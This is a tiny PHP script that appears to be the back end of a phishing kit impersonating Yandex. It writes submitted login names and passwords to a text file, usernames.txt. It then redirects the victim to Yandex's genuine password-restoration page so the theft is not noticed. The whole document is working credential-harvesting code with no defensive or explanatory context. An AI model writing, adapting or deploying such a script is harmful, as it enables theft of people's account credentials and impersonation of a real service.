<?php

file_put_contents("usernames.txt", "Account: " . $_POST['login'] . "\nPass: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://passport.yandex.com/restoration');
exit();
